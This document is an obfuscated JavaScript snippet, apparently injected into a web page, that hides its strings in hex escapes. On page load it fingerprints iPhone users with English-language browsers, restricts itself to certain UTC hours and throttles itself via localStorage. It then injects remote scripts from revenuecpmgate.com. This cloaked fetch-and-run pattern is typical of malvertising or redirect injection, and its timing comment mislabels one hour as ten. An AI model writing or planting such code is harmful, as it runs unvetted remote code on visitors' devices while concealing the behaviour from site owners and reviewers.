function isIphone() {
    return /iPhone/i ['test'](navigator['userAgent'])
}

function isLanguageExcluded() {
    const language = navigator['language']['toLowerCase']();
    return language['includes']('\x65\x6e') 
}


function canExecuteByFrequency() {
    const lastExecutionKey = '\x6c\x61\x73\x74\x41\x64\x45\x78\x65\x63\x75\x74\x69\x6f\x6e\x54\x69\x6d\x65\x73\x74\x61\x6d\x70'; 
    const lastExecutionTime = localStorage['getItem'](lastExecutionKey);
    if (!lastExecutionTime) {
        return true
    }
    const tenHoursInMillis = 1 * 60 * 60 * 1000;
    const timeSinceLastExecution = window["Date"]['now']() - window["parseInt"](lastExecutionTime, 10);
    return timeSinceLastExecution > tenHoursInMillis
}

function executeAdScript() {
    const _0x4e12x1 = [0, 7, 5]; 
    const _0x4e12x2 = new window["\x44\x61\x74\x65"]();
    const _0x4e12x3 = _0x4e12x2['\x67\x65\x74\x55\x54\x43\x48\x6f\x75\x72\x73']();
    const _0x4e12x4 = (_0x4e12x3 + _0x4e12x1[2]) % 24;
    const _0x4e12x5 = _0x4e12x4 >= _0x4e12x1[0] && _0x4e12x4 < _0x4e12x1[1];

    if (isIphone() && isLanguageExcluded() && _0x4e12x5 && canExecuteByFrequency()) {
        const script1 = window["document"]['createElement']('\x73\x63\x72\x69\x70\x74');
        script1['type'] = '\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74';
        script1['src'] = '//pl27628871.revenuecpmgate.com/bc/88/84/bc88842a70674a0bfb85bf63a9a64c78.js';
        window["document"]['head']['appendChild'](script1);
        localStorage['setItem']('\x6c\x61\x73\x74\x41\x64\x45\x78\x65\x63\x75\x74\x69\x6f\x6e\x54\x69\x6d\x65\x73\x74\x61\x6d\x70', window["Date"]['now']()['\x74\x6f\x53\x74\x72\x69\x6e\x67']()); // 'lastAdExecutionTimestamp', 'toString'

        const _0x4e12x6 = ['\x72\x61\x6e\x64\x6f\x6d']; // ['random']
        if (window["Math"][_0x4e12x6[0]]() < 0.6) {
            const script2 = window["document"]['createElement']('\x73\x63\x72\x69\x70\x74');
            script2['type'] = '\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74'; 
            script2['src'] = '//pl27798995.revenuecpmgate.com/e1/f3/15/e1f3155eb62046226bb4ff1cb2d2f2fe.js';
            window["document"]['head']['appendChild'](script2)
        }
    }
}
window["document"]['addEventListener']('\x44\x4f\x4d\x43\x6f\x6e\x74\x65\x6e\x74\x4c\x6f\x61\x64\x65\x64', executeAdScript); 
